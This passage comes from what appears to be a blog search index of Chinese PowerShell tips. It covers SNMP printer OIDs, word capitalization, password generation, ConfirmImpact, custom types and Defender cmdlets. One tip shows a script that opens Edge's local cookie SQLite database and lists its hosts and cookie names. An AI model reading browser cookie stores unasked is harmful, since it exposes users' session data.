&quot;.1.3.6.1.2.1.43.10.2.1.4.1.1&quot;$OID_HARDWARE_ADDRESS = &quot;.1.3.6.1.2.1.2.2.1.6.1&quot;$OID_TRAY_1_NAME = &quot;.1.3.6.1.2.1.43.8.2.1.13.1.1&quot;$OID_TRAY_1_CAPACITY = &quot;.1.3.6.1.2.1.43.8.2.1.9.1.1&quot;$OID_TRAY_1_LEVEL = &quot;.1.3.6.1.2.1.43.8.2.1.10.1.1&quot;$OID_TRAY_2_NAME = &quot;.1.3.6.1.2.1.43.8.2.1.13.1.2&quot;$OID_TRAY_2_CAPACITY = &quot;.1.3.6.1.2.1.43.8.2.1.9.1.2&quot;$OID_TRAY_2_LEVEL = &quot;.1.3.6.1.2.1.43.8.2.1.10.1.2&quot;$OID_TRAY_3_NAME = &quot;.1.3.6.1.2.1.43.8.2.1.13.1.3&quot;$OID_TRAY_3_CAPACITY = &quot;.1.3.6.1.2.1.43.8.2.1.9.1.3&quot;$OID_TRAY_3_LEVEL = &quot;.1.3.6.1.2.1.43.8.2.1.10.1.3&quot;$OID_TRAY_4_NAME = &quot;.1.3.6.1.2.1.43.8.2.1.13.1.4&quot;$OID_TRAY_4_CAPACITY = &quot;.1.3.6.1.2.1.43.8.2.1.9.1.4&quot;$OID_TRAY_4_LEVEL = &quot;.1.3.6.1.2.1.43.8.2.1.10.1.4&quot;$OID_BLACK_TONER_CARTRIDGE_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.1&quot;$OID_BLACK_TONER_CARTRIDGE_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.1&quot;$OID_BLACK_TONER_CARTRIDGE_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.1&quot;$OID_CYAN_TONER_CARTRIDGE_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.2&quot;$OID_CYAN_TONER_CARTRIDGE_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.2&quot;$OID_CYAN_TONER_CARTRIDGE_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.2&quot;$OID_MAGENTA_TONER_CARTRIDGE_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.3&quot;$OID_MAGENTA_TONER_CARTRIDGE_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.3&quot;$OID_MAGENTA_TONER_CARTRIDGE_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.3&quot;$OID_YELLOW_TONER_CARTRIDGE_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.4&quot;$OID_YELLOW_TONER_CARTRIDGE_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.4&quot;$OID_YELLOW_TONER_CARTRIDGE_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.4&quot;$OID_WASTE_TONER_BOX_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.5&quot;$OID_WASTE_TONER_BOX_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.5&quot;$OID_WASTE_TONER_BOX_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.5&quot;$OID_BELT_UNIT_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.6&quot;$OID_BELT_UNIT_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.6&quot;$OID_BELT_UNIT_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.6&quot;$OID_BLACK_DRUM_UNIT_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.7&quot;$OID_BLACK_DRUM_UNIT_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.7&quot;$OID_BLACK_DRUM_UNIT_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.7&quot;$OID_CYAN_DRUM_UNIT_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.8&quot;$OID_CYAN_DRUM_UNIT_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.8&quot;$OID_CYAN_DRUM_UNIT_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.8&quot;$OID_MAGENTA_DRUM_UNIT_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.9&quot;$OID_MAGENTA_DRUM_UNIT_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.9&quot;$OID_MAGENTA_DRUM_UNIT_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.9&quot;$OID_YELLOW_DRUM_UNIT_NAME = &quot;.1.3.6.1.2.1.43.11.1.1.6.1.10&quot;$OID_YELLOW_DRUM_UNIT_CAPACITY = &quot;.1.3.6.1.2.1.43.11.1.1.8.1.10&quot;$OID_YELLOW_DRUM_UNIT_LEVEL = &quot;.1.3.6.1.2.1.43.11.1.1.9.1.10&quot;#endregion","link":"/2023/01/23/querying-advanced-printer-info-via-snmp/"},{"title":"PowerShell 技能连载 - 导出 Edge 的 Cookie","text":"如果您希望查找或者导出 Edge 浏览器存储的网站 cookie，PowerShell 可以帮您导出以上信息。cookie 列表实际上存储在一个 SQLite 数据库的 “Cookies” 表中。 从 PowerShellGallery.com 安装了 “ReallySimpleDatabase” 免费模块之后，连接和读取数据库十分容易： 12345678910111213#requires -Modules ReallySimpleDatabase&lt;#make sure you install the required module before you run this script:Install-Module -Name ReallySimpleDatabase -Scope CurrentUser#&gt;$path = &quot;$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies&quot;$db = Get-Database -Path $PATH$db.InvokeSql('select * from cookies') | Select-Object host_key, name","link":"/2023/01/27/dumping-edge-cookies/"},{"title":"PowerShell 技能连载 - 将 PowerShell 脚本作为命令（第 2 部分）","text":"在上一个技能中，我们讨论了一种扩展 PowerShell 命令集的简易方法。通过将脚本保存到一个文件夹中，并且将文件夹添加到环境变量 $env:path 中，PowerShell 将会识别出该文件夹中的所有脚本并将它们作为新命令。 PowerShell 脚本支持和函数相同的用户参数机制。让我们看看如何将一个使用参数的新的基于脚本的命令加入 PowerShell。 将以下脚本保存到 c:\\myPsCommands 目录中的 “New-Password.ps1”。您可能需要先创建该文件夹。 123456789101112131415161718192021222324[CmdletBinding()]param( $CapitalLetter = 4, $Numeric = 1, $LowerLetter = 3, $Special = 2)$characters = &amp; { 'ABCDEFGHKLMNPRSTUVWXYZ' -as [char[]] | Get-Random -Count $CapitalLetter '23456789'.ToCharArray() | Get-Random -Count $Numeric 'abcdefghkmnprstuvwxyz'.ToCharArray() | Get-Random -Count $LowerLetter '§$%&amp;?=#*+-'.ToCharArray() | Get-Random -Count $Special} | Sort-Object -Property { Get-Random }$characters -join '' 下一步，将文件夹路径添加到 PowerShell 的命令搜索路径，例如运行这段代码： 1PS&gt; $env:path += &quot;;c:\\myPSCommands&quot; 现在您可以想普通命令一样运行存储在文件夹中的任意脚本。如果脚本的开始处有 param() 块，那么支持传入参数。当您按示例操作后，就可以得到一个名为 New-Password 的命令，用来生成复杂密码，以及通过参数帮您组合密码： 12PS&gt; New-Password -CapitalLetter 2 -Numeric 1 -LowerLetter 8 -Special 2yx+nKfph?M8rw","link":"/2023/01/31/using-powershell-scripts-as-commands-part-2/"},{"title":"PowerShell 技能连载 - 将 PowerShell 脚本作为命令（第 1 部分）","text":"一种扩展 PowerShell 命令的简单方法是使用脚本。要将一段脚本转换为命令，请选择一个文件夹并将 PowerShell 脚本存储在该文件夹中。脚本的名字将会转化为命令名。 例如，将以下脚本以 “New-Password” 名字保存在一个文件夹中： 1234567891011121314151617181920$CapitalLetter = 4$Numeric = 1$LowerLetter = 3$Special = 2$characters = &amp; { 'ABCDEFGHKLMNPRSTUVWXYZ' -as [char[]] | Get-Random -Count $CapitalLetter '23456789'.ToCharArray() | Get-Random -Count $Numeric 'abcdefghkmnprstuvwxyz'.ToCharArray() | Get-Random -Count $LowerLetter '§$%&amp;?=#*+-'.ToCharArray() | Get-Random -Count $Special} | Sort-Object -Property { Get-Random }$characters -join '' 该脚本将产生一个随机的密码，然后您可以通过顶部的变量来控制组合。 要使用该脚本作为新的命令，请确保 PowerShell 包含您在搜索命令中保存脚本的文件夹。假设您将脚本保存在名为 “c:\\myPsCommands” 文件夹下。然后运行以下代码将会将该文件夹添加到命令搜索路径中： 1$env:path += &quot;;c:\\myPsCommands&quot; 一旦您做了这个调整，就可以输入命令名 “New-Password“ 轻松运行您的脚本。本质上该脚本名称转化为一个可执行的命令名。","link":"/2023/01/31/using-powershell-scripts-as-commands-part-1/"},{"title":"PowerShell 技能连载 - 研究 PowerShell 命令结果","text":"HTML 是一种简单的格式化输出报告的方法。在这个三部曲系列中，我们首先演示如何生成 HTML 报告，然后展示一种简单的方法将 HTML 报告转为 PDF 文档。 一个简单的研究命令返回结果的方法是使用 Select-Object 显示第一个（随机的）返回结果的所有属性。以下是一个例子： 1Get-Service | Select-Object -Property * -First 1 通过这种方法，您可以获得一个返回结果，它的所有属性都可见，并且您可以看见这些属性中的实际数值来更好地评估要使用哪些属性。 另一个研究的方法是使用 Get-Member 从更偏技术/定义的角度查看所有可用的属性: ···powershellGet-Service | Get-Member -MemberType *property 现在，您可以查看所有返回的数据类型，以及每个定义为 &quot;`{get;}`&quot;（只读）或 &quot;`{get;set;}`&quot;（读写）的属性。 &lt;!--本文国际来源：[Investigating PowerShell Command Results](https://blog.idera.com/database-tools/powershell/powertips/investigating-powershell-command-results/)--&gt;","link":"/2023/01/25/investigating-powershell-command-results/"},{"title":"PowerShell 技能连载 - 使用枚举来解析序号","text":"WMI 是一个简单的获取计算机信息的方法。例如要确定您所使用的计算机类型，是一件很容易的事： 12$info = (Get-CimInstance -ClassName win32_computersystem).PCSystemType$info 不幸的是，WMI 属性往往返回的是幻数而不是友好的文本，所以当您在笔记本电脑上运行以上代码，将得到结果 “2”。如果返回其它结果，还需要上 google 搜索该数字的含义。 一旦你获得了代码，在 PowerShell 中就有一种简单而有效的方法可以使用枚举将数字转换为友好的文本： 123456789101112131415enum ServerTypes{ Unspecified Desktop Mobile Workstation EnterpriseServer SOHOServer AppliancePC PerformanceServer Maximum}[ServerTypes]$info = (Get-CimInstance -ClassName win32_computersystem).PCSystemType$info 枚举将友好的文本与代码号绑定，默认情况下以 0 开头。上面的枚举将 “Unspecified” 绑定为代码 0，”Mobile” 绑定为代码 2。 By assigning the enum type [ServerTypes] to your result variable, all translating is performed automatically, and cryptic code numbers now show as friendly text.通过将枚举类型 [ServerTypes] 绑定到您的结果变量，所有转换都会自动进行，而且现在幻数可以转换为友好的文本。 由于 ID 数字在不断变化，因此可能会遇到新的代码，所以必须扩展枚举。","link":"/2023/02/06/using-enums-to-decipher-code-ids/"},{"title":"PowerShell 技能连载 - 选择最佳方法：单词转大写（第 1 部分）","text":"在 PowerShell 中，当您需要解决一个问题时，有四种不同来源的命令可以选择。在这个迷你系列中，我们依次查看所有方法。要解决的是同一个问题：如何将一个单词的首字母改为大写。请注意，这是我们随意选为例子的一个问题。该解决方案适用于任何想用 PowerShell 解决的问题。 在 PowerShell 中要解决一个问题最简单的方法是使用合适的 PowerShell cmdlet。可以使用 Get-Command 来搜索已有的 cmdlet。不幸的是，不可能对于任何问题都有完美的 cmdlet。在这种情况中可能找不到合适的 cmdlet。 在这种情况下，PowerShell 任然提供了许多途径来解决问题。在今天的解决方案中，我们使用 PowerShell 运算符和 .NET 方法： 123456789101112131415$text = &quot;thIS is A TEST teXT&quot;# split text in words$words = $text -split '\\s{1,}' |# use ForEach-Object to break down the problem to solving ONE instance of your problem# regardless of how many words there are, the following script block deals with# one word at a time:ForEach-Object { $theWord = $_ # use .NET string methods on the object to solve your issue: $theWord.SubString(0,1).toUpper() + $theWord.SubString(1).ToLower()}# the result is a string array. Use the -join operator to turn it into ONE string:$result = $words -join ' '$result 结果看起来不错： This Is A Test Text","link":"/2023/02/09/picking-best-approach-example-capitalizing-words-part-1/"},{"title":"PowerShell 技能连载 - 检测电池健康与质量","text":"如果您在使用笔记本电脑，那么可以轻松地询问 WMI 得到电池的状态，例如充电状态。如果多做一点功课，您还可以检查电池的健康并且了解是否该更换电池。 本质上，下面的脚本使用不同的 WMI 类来确定电池的标称容量和实际容量，然后以百分比计算其有效容量。任何低于 80% 的百分比通常表明高度损耗和需要更换电池。 12345678910$designCap = Get-WmiObject -Class &quot;BatteryStaticData&quot; -Namespace &quot;ROOT\\WMI&quot; |Group-Object -Property InstanceName -AsHashTable -AsStringGet-CimInstance -Class &quot;BatteryFullChargedCapacity&quot; -Namespace &quot;ROOT\\WMI&quot; |Select-Object -Property InstanceName, FullChargedCapacity, DesignedCapacity, Percent |ForEach-Object { $_.DesignedCapacity = $designCap[$_.InstanceName].DesignedCapacity $_.Percent = [Math]::Round( ( $_.FullChargedCapacity*100/$_.DesignedCapacity),2) $_}","link":"/2023/02/08/checking-battery-wear-and-quality/"},{"title":"PowerShell 技能连载 - 选择最佳方法：单词转大写（第 1 部分）","text":"在 PowerShell 中，当您需要解决一个问题时，有四种不同来源的命令可以选择。在这个迷你系列中，我们依次查看所有方法。要解决的是同一个问题：如何将一个单词的首字母改为大写。请注意，这是我们随意选为例子的一个问题。该解决方案适用于任何想用 PowerShell 解决的问题。 在 PowerShell 中要解决一个问题最简单的方法是使用合适的 PowerShell cmdlet。可以使用 Get-Command 来搜索已有的 cmdlet。不幸的是，不可能对于任何问题都有完美的 cmdlet。在这种情况中可能找不到合适的 cmdlet。 在这种情况下，PowerShell 任然提供了许多途径来解决问题。在今天的解决方案中，我们使用 PowerShell 运算符和 .NET 方法： 123456789101112131415$text = &quot;thIS is A TEST teXT&quot;# split text in words$words = $text -split '\\s{1,}' |# use ForEach-Object to break down the problem to solving ONE instance of your problem# regardless of how many words there are, the following script block deals with# one word at a time:ForEach-Object { $theWord = $_ # use .NET string methods on the object to solve your issue: $theWord.SubString(0,1).toUpper() + $theWord.SubString(1).ToLower()}# the result is a string array. Use the -join operator to turn it into ONE string:$result = $words -join ' '$result 结果看起来不错： This Is A Test Text","link":"/2023/02/10/picking-best-approach-example-capitalizing-words-part-1/"},{"title":"PowerShell 技能连载 - 选择最佳方法：单词转大写（第 3 部分）","text":"在 PowerShell 中，当您需要解决一个问题时，有四种不同来源的命令可以选择。在这个迷你系列中，我们依次查看所有方法。要解决的是同一个问题：如何将一个单词的首字母改为大写。请注意，这是我们随意选为例子的一个问题。该解决方案适用于任何想用 PowerShell 解决的问题。 在前一部分中，我们已经使用 PowerShell 操作符和通用的字符串方法来解决问题。然而，在代码中通常有一个真理：使用越专用的命令，代码就越简洁。 所以 PowerShell 可以使用另一个来源的命令：从和 PowerShell 一起分发的上千个 .NET 库中选择静态 .NET 方法。有一个比通用操作符和字符串方法简单得多的解决方案： 123456$text = &quot;thIS is A TEST teXT&quot;[CultureInfo]::InvariantCulture.TextInfo.ToTitleCase($text)Words that are ALL CAPITALIZED will remain untouched:This Is A TEST Text 如果您不喜欢有些例外的单词没有被转成首字母大写，那么先将文本转为全小写然后传给该方法： 12345PS&gt; [CultureInfo]::InvariantCulture.TextInfo.ToTitleCase('TEST remains aLL uppER Case')TEST Remains All Upper CasePS&gt; [CultureInfo]::InvariantCulture.TextInfo.ToTitleCase('TEST remains aLL uppER Case unless you lowerCASE YOUR text beFORE'.ToLower())Test Remains All Upper Case Unless You Lowercase Your Text Before 如您所见（和这个系列之前的部分相比），空格仍然保持不变，由于我们从没有将文本分割为独立的单词。如果您不喜欢这一点，并且想将多个空格符合并为一个，只需要添加 -replace 运算符。它能将所有字符串整理好： 1234567$text = &quot;thIS is A TEST teXT&quot;# title convert and then replace two or more spaces with one space only:[CultureInfo]::InvariantCulture.TextInfo.ToTitleCase($text.ToLower()) -replace '\\s{2,}', ' 'Now this approach returns the exact same result as in our previous parts:This Is A Test Text 以上代码很短并且很简单，这样您可以直接在代码合适的地方使用它，但是您下星期或者下个月要做相同的转换时还能记得它吗？ 所以仍然可以将该代码包装成为一个函数。您可以将我们在第 2 部分中创建的函数升级为更新更有效的方式： 12345678910111213function Convert-CapitalizeWord{ param ( [Parameter(Mandatory,ValueFromPipeline)] $Text ) process { [CultureInfo]::InvariantCulture.TextInfo.ToTitleCase($text.ToLower()) -replace '\\s{2,}', ' ' }} 当您运行该函数，它将和之前的版本一样灵活和可扩展： 123456789101112131415# you get automatic prompts when you forget to submit mandatory arguments:PS&gt; Convert-CapitalizeWordcmdlet Convert-CapitalizeWord at command pipeline position 1Supply values for the following parameters:Text: heLLO WOrldHello World# you can submit your text to the -Text parameter:PS&gt; Convert-CapitalizeWord -Text 'this iS a LONG teXT'This Is A Long Text# you can pipe as many texts as you like (scalable) via the pipeline:PS&gt; 'Hello world!', 'someTHING else' | Convert-CapitalizeWordHello World!Something Else","link":"/2023/02/12/picking-best-approach-example-capitalizing-words-part-3/"},{"title":"PowerShell 技能连载 - 选择最佳方法：单词转大写（第 2 部分）","text":"在 PowerShell 中，当您需要解决一个问题时，有四种不同来源的命令可以选择。在这个迷你系列中，我们依次查看所有方法。要解决的是同一个问题：如何将一个单词的首字母改为大写。请注意，这是我们随意选为例子的一个问题。该解决方案适用于任何想用 PowerShell 解决的问题。 在 PowerShell 中要解决一个问题最简单的方法是使用合适的 PowerShell cmdlet。可以使用 Get-Command 来搜索已有的 cmdlet。在第一部分中我们已经发现没有一个特定的 PowerShell cmdlet 可以做这件事，所以不得不使用低级的方法来解决这个任务。 由于我们现在已经有解决方案，我们只需要将以下代码转为一个全新的 PowerShell cmdlet（这样我们不需要重复发明这个解决方案，以及我们的生产代码变得更精炼切易于理解和回顾）： 123456789101112131415$text = &quot;thIS is A TEST teXT&quot;# split text in words$words = $text -split '\\s{1,}' |# use ForEach-Object to break down the problem to solving ONE instance of your problem# regardless of how many words there are, the following script block deals with# one word at a time:ForEach-Object { $theWord = $_ # use .NET string methods on the object to solve your issue: $theWord.SubString(0,1).toUpper() + $theWord.SubString(1).ToLower()}# the result is a string array. Use the -join operator to turn it into ONE string:$result = $words -join ' '$result 将一段代码转为一个可重用的 cmdlet 只需要按照这些固定的步骤：将代码封装在一个函数中，然后定义它的输入（被称为参数）。例如这样： 1234567891011121314151617181920212223242526function Convert-CapitalizeWord{ param ( [Parameter(Mandatory,ValueFromPipeline)] $Text ) process { # split text in words $words = $Text -split '\\s{1,}' | # use ForEach-Object to break down the problem to solving ONE instance of your problem # regardless of how many words there are, the following script block deals with # one word at a time: ForEach-Object { $theWord = $_ # use .NET string methods on the object to solve your issue: $theWord.SubString(0,1).toUpper() + $theWord.SubString(1).ToLower() } # the result is a string array. Use the -join operator to turn it into ONE string: $result = $words -join ' ' $result }} 请注意头部和尾部的代码。函数中实现逻辑的部分（这个例子中的文本转换部分）仍然保持不变。 当您运行以上代码，PowerShell 设置您的新函数。然后您可以按自己的喜好任意多次调用它，并且由于它是支持管道的，所以您甚至可以通过管道将文本从其它 cmdlet 传给它。如果您想，您可以使用 Get-Content 来读取整个文本并使用 Convert-CapitalizeWord 将每个单词的首字母改为大写——PowerShell 中的函数像一个奇迹，能够使得函数可复用以及可伸缩： 123456789101112131415# you get automatic prompts when you forget to submit mandatory arguments:PS&gt; Convert-CapitalizeWordcmdlet Convert-CapitalizeWord at command pipeline position 1Supply values for the following parameters:Text: heLLO WOrldHello World# you can submit your text to the -Text parameter:PS&gt; Convert-CapitalizeWord -Text 'this iS a LONG teXT'This Is A Long Text# you can pipe as many texts as you like (scalable) via the pipeline:PS&gt; 'Hello world!', 'someTHING else' | Convert-CapitalizeWordHello World!Something Else 您可以将函数复制/粘贴到需要使用的脚本中。 为了让函数认识并自动加载（类似所有其它“内置”PowerShell cmdlet），并且成为您 shell 的一个永久的命令扩展，您可以将函数存储在模块中。 目前，收获是：通过包装代码在函数，使得代码可重用，自动添加了可扩展性（在上面的例子中，我们现在可以转换在一个调用中转换一个或者上千个字符串），以及使生产脚本代码变得更短，可以专注于它真正想要完成什么。","link":"/2023/02/14/picking-best-approach-example-capitalizing-words-part-2/"},{"title":"PowerShell 技能连载 - Picking Best Approach Example Capitalizing Words (Part 4)","text":"","link":"/2023/02/20/picking-best-approach-example-capitalizing-words-part-4/"},{"title":"PowerShell 技能连载 - 研究 ConfirmImpact（第 2 部分：脚本作者视角）","text":"在前面的部分中，已经解释了 PowerShell 将 $ConfirmPreference 自动变量作为其风险缓解系统的一部分使用：每当一个 PowerShell 命令自身的 “ConfirmImpact“ 高于或等于 $ConfirmPreference 中的设置时，PowerShell 将显示自动确认对话框。 作为函数或脚本作者，您可以使用属性 CmdletBinding() 设置函数或脚本的“影响级别”： 123456789101112function Remove-Something{ [CmdletBinding(ConfirmImpact='Medium')] param ( [Parameter(Mandatory)] [string] $Name ) &quot;You entered $Name&quot;} 示例函数 Remove-Something 已将其 ConfirmImpact 声明为 “Medium“，因此当您运行它时，如果 $ConfirmPreference 设置为 “Medium“ 以上的级别，PowerShell 将触发自动确认。 二进制 cmdlet 也是一样。要找出二进制 cmdlet 的确认影响，您可以使用以下函数： 12345678910111213filter Get-ConfirmInfo{ param ( [Parameter(Mandatory,ValueFromPipeline)] [string] $CommandName ) $CommandInfo = Get-Command -Name $CommandName [System.Management.Automation.CommandMetaData]::new($CommandInfo) | Select-Object -Property Name, ConfirmImpact, SupportsShouldProcess} 当您提交命令名称时，它将显示命令作者定义的 ConfirmImpact，以及命令是否支持模拟开关，例如 -WhatIf（在这个情况下，SupportsShouldProcess 显示 $true）。 1234567PS&gt; 'Get-Random', 'Remove-Item', 'Stop-Process' | Get-ConfirmInfoName ConfirmImpact SupportsShouldProcess---- ------------- ---------------------Get-Random Medium FalseRemove-Item Medium TrueStop-Process Medium True 由于 Get-ConfirmInfo 支持管道，因此您甚至可以检查您的 PowerShell 命令集并搜索高影响级别的命令： 123456789101112PS&gt; Get-Command -Verb Remove | Get-ConfirmInfo | Where-Object ConfirmImpact -eq HighName ConfirmImpact SupportsShouldProcess---- ------------- ---------------------Remove-CIAccessControlRule High TrueRemove-CIVApp High TrueRemove-CIVAppNetwork High TrueRemove-CIVAppTemplate High TrueRemove-BCDataCacheExtension High TrueRemove-ClusterAffinityRule High TrueRemove-ClusterFaultDomain High True(...)","link":"/2023/02/24/investigating-confirmimpact-part-2-script-author-perspective/"},{"title":"PowerShell 技能连载 - 研究 ConfirmImpact（第 1 部分：用户视角）","text":"在 PowerShell 中，默认情况下，$ConfimPreference 变量设置为 “High“。这个设置控制什么？ 12PS&gt; $ConfirmPreferenceHigh 任何 PowerShell 命令（二进制 cmdlet 或函数）都可以设置自己的 “ConfirmImpact“：允许的值为 None、Low、Medium 和 High。ConfirmImpact 是一个评估 cmdlet 效果的关键性程度。 默认情况下，当 $ConfirmImpact 设置为 “High“ 时，PowerShell 将在你运行设置了 ConfirmImpact 为 High 的cmdlet 或函数时自动要求确认（所以你只会在运行像 AD 账户这样不能轻易恢复的东西的 cmdlets 时看到确认对话框弹出）。 作为用户，您可以调整这个风险缓解系统。如果你在一个十分敏感的生产系统上工作，你可能想把 $ConfirmPreference 降低到 Medium 或甚至 Low，以在运行 PowerShell 命令或脚本时获得更多的确认。当设置为 “Low“时，即使创建一个新文件夹也会触发自动确认： 12345678910PS&gt; $ConfirmPreference = 'Low'PS&gt; New-Item -Path c:\\testfolderConfirmAre you sure you want to perform this action?Performing the operation &quot;Create File&quot; on target &quot;Destination:C:\\testfolder&quot;.[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help(default is &quot;Y&quot;): 同样地，如果你想运行一个脚本而不被自动确认对话框打断，你可以把 $ConfirmPreference 设置为 “None“，从而关闭这个风险缓解系统。这比为脚本中可能触发确认的每个命令添加 -Confirm:$false 参数来手动覆盖自动确认要高效得多。 对 $ConfirmPreference 的任何更改都会在关闭当前 PowerShell 会话时恢复为默认值。它们不会自动持久化。如果您想永久更改这些设置，请创建一个配置文件脚本并将所有永久更改添加到这个脚本中。当 PowerShell 启动时，它会自动启动。 这样的配置文件脚本的路径可以在这里找到： 12PS&gt; $profile.CurrentUserAllHostsC:\\Users\\USERNAME\\OneDrive\\Documents\\WindowsPowerShell\\profile.ps1","link":"/2023/02/22/investigating-confirmimpact-part-1-user-perspective/"},{"title":"PowerShell 技能连载 - 使用合适的数据类型（第 1 部分）","text":"Windows 是一个 API 驱动的操作系统，而 PowerShell 也是如此。与其他使用纯文本作为基础元素并让用户通过 grep 和正则表达式来结构化数据的 shell 相比，PowerShell（和底层的 .NET 框架）提供了一组丰富的数据类型，您可以从中选择最适合的来完美地存储数据。 默认情况下，PowerShell 仅使用基本数据类型，例如[string]（文本），[int]（数字），[double]（浮点数），[datetime]（日期和时间）和[bool]（真和假）。 You however can pick any other data type that you find more suitable:但是，您可以选择任何其他您认为更合适的数据类型： 12345678910111213141516171819202122232425262728293031PS&gt; [System.IO.FileInfo]'c:\\test\\somefile.txt'Mode LastWriteTime Length Name---- ------------- ------ ----darhsl 01.01.1601 01:00 () somefile.txtPS&gt; [System.IO.FileInfo]'c:\\test\\somefile.txt' | Select-Object -Property *Mode : darhslVersionInfo :BaseName : somefileTarget :LinkType :Name : somefile.txtLength :DirectoryName : c:\\testDirectory : c:\\testIsReadOnly : TrueExists : FalseFullName : c:\\test\\somefile.txtExtension : .txtCreationTime : 01.01.1601 01:00:00CreationTimeUtc : 01.01.1601 00:00:00LastAccessTime : 01.01.1601 01:00:00LastAccessTimeUtc : 01.01.1601 00:00:00LastWriteTime : 01.01.1601 01:00:00LastWriteTimeUtc : 01.01.1601 00:00:00Attributes : -1 通过将通用数据类型（如字符串）转换为更适当的数据类型，访问单个信息变得更加容易。例如，如果您想解析文件路径，通过将字符串转换为[System.Io.FileInfo]，您可以轻松地拆分路径并提取驱动器、父文件夹、文件名、没有扩展名的文件名或扩展名： 123456789101112131415161718192021222324252627PS&gt; $path = [System.IO.FileInfo]'c:\\test\\somefile.txt'PS&gt; $path.DirectoryNamec:\\testPS&gt; $path.FullNamec:\\test\\somefile.txtPS&gt; $path.Namesomefile.txtPS&gt; $path.BaseNamesomefilePS&gt; $path.Extension.txtPS&gt; $path.Directory.ParentMode LastWriteTime Length Name---- ------------- ------ ----d--hs- 15.02.2023 17:33 c:\\PS&gt; $path.Directory.Parent.Namec:\\","link":"/2023/02/28/using-appropriate-datatypes-part-1/"},{"title":"PowerShell 技能连载 - Picking Best Approach: Example Capitalizing Words (Part 3)","text":"","link":"/2023/02/16/picking-best-approach-example-capitalizing-words-part-3/"},{"title":"PowerShell 技能连载 - 使用合适的数据类型（第 2 部分）","text":"第 1 部分中我们介绍了将数据转换为更适合的 .NET 数据类型后数据的可用性如何提高。 如果无法为数据找到现有的数据类型以为其提供结构，也可以创建自己的数据类型。 假设您需要处理名称。这是一个名为 [TeamMember] 的自定义数据类型，可以为名称添加结构： 123456789101112131415161718192021222324252627282930313233343536373839404142class TeamMember{ [string]$FirstName [string]$LastName TeamMember([string]$Name) { # case correct text $newName = [cultureinfo]::InvariantCulture.TextInfo.ToTitleCase($Name) # automatically find delimiter character $delimiter = $newName.ToCharArray() -match '[,. ]' | Select-Object -First 1 # no delimiter? if ($delimiter.Count -eq 0) { $this.LastName = $Name return } $array = $newName.Split($delimiter) # based on found delimiter switch -Regex ($delimiter) { # dot or space: '[.\\s]' { $this.FirstName = $array[0] $this.LastName = $array[1] } # comma '\\,' { $this.FirstName = $array[1] $this.LastName = $array[0] } # invalid default { $this.LastName = $Name } } }} 运行此代码后，定义了名为 [TeamMember] 的新数据类型。现在可以将包含名称的字符串简单地转换为结构化数据类型： 123456789101112131415161718192021PS&gt; [TeamMember]'tobias weltner'FirstName LastName--------- --------Tobias WeltnerPS&gt; [TeamMember]'tobias.weltner'FirstName LastName--------- --------Tobias WeltnerPS&gt; [TeamMember]'weltner,tobias'FirstName LastName--------- --------Tobias Weltner 还有个额外的好处，即自动纠正大小写，或者说，您的类可以包含任何您喜欢的魔法。当您后来使用该类型时，您不再需要担心它。 更好的是，当将此类型分配给变量时，它将自动将任何名称转换为新结构，即使在以后的赋值中也是如此： 12345678910111213141516PS&gt; [TeamMember]$name = 'Tobias Weltner'PS&gt; $nameFirstName LastName--------- --------Tobias WeltnerPS&gt; $name = 'kloVER,kaRL'PS&gt; $nameFirstName LastName--------- --------Karl Klover 自定义类的自动转换的秘密在于其构造函数。当构造函数接受一个 [string] 类型的参数时，它可以自动将任何字符串转换为新结构。 类的构造函数和类名相同，并且输入参数为 [string]： 1234TeamMember([string]$Name) { ... }","link":"/2023/03/02/using-appropriate-datatypes-part-2/"},{"title":"PowerShell 技能连载 - 自动化操作 Defender 杀毒软件（第 1 部分）","text":"在 Windows 上，PowerShell 带有用于自动化操作内置防病毒引擎 “Defender” 的 cmdlet。 如果您想自动更新签名，请尝试以下操作： 1PS C:\\&gt; Update-MpSignature 如果您在计划任务的脚本中运行此命令，则现在可以完全控制。无需管理员特权。 同样，PowerShell 可以仅使用一个命令随时启动快速扫描： 1PS C:\\&gt; Start-MpScan -ScanType QuickScan 扫描进度显示为 PowerShell 进度条，无需打开烦人的对话框。 如果您想知道您最近面临的最新威胁，请让 Defender 输出其威胁分析： 12345678910111213PS C:\\&gt; Get-MpThreatCategoryID : 27DidThreatExecute : FalseIsActive : TrueResources :RollupStatus : 1SchemaVersion : 1.0.0.0SeverityID : 1ThreatID : 311978ThreatName : PUADlManager:Win32/DownloadSponsorTypeID : 0PSComputerName :","link":"/2023/03/06/automating-defender-antivirus-part-1/"},{"title":"PowerShell 技能连载 - 存储任何加密的文本","text":"假设您的脚本需要敏感输入，例如数据库的连接字符串或其他文本信息。 管理此类机密信息的一种方法是将它们存储为 [SecureString]，并安全地序列化此信息到 XML。以下是此部分的操作： 12345678$Path = 